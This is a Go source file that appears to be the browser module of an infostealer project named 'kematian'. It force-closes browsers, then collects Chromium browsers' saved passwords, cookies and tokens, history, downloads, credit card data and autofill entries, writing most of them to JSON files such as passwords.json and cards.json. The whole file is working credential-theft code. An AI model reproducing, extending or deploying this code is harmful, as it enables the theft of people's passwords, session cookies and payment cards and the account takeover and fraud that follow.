package browsers

import (
	"kdot/kematian/browsers/chromium/autofill"
	"kdot/kematian/browsers/chromium/cards"
	"kdot/kematian/browsers/chromium/cookies"
	"kdot/kematian/browsers/chromium/downloads"
	"kdot/kematian/browsers/chromium/history"
	"kdot/kematian/browsers/chromium/pass"
	"kdot/kematian/browsers/chromium/structs"
	"kdot/kematian/browsers/util"
	"os"
)

func GetBrowserPasswords(browsers []structs.Browser) {
	//fmt.Println(pass.GetPasswords())
	os.WriteFile("passwords.json", []byte(pass.Get(browsers)), 0644)
}

func GetBrowserCookies(browsers []structs.Browser) {
	cookies.GetTokensAuto(browsers)
}

func GetBrowserHistory(browsers []structs.Browser) {
	//fmt.Println(history.GetHistory())
	os.WriteFile("history.json", []byte(history.Get(browsers)), 0644)
}

func GetBrowserAutofill(browsers []structs.Browser) {
	os.WriteFile("autofill.json", []byte(autofill.Get(browsers)), 0644)
}

func GetBrowserCards(browsers []structs.Browser) {
	os.WriteFile("cards.json", []byte(cards.Get(browsers)), 0644)
}

func GetBrowserDownloads(browsers []structs.Browser) {
	os.WriteFile("downloads.json", []byte(downloads.Get(browsers)), 0644)
}

func GetBrowserData(totalBrowsers []structs.Browser) {
	util.CloseBrowsers()
	GetBrowserPasswords(totalBrowsers)
	GetBrowserHistory(totalBrowsers)
	GetBrowserCookies(totalBrowsers)
	GetBrowserDownloads(totalBrowsers)
	GetBrowserCards(totalBrowsers)
	GetBrowserAutofill(totalBrowsers)
}
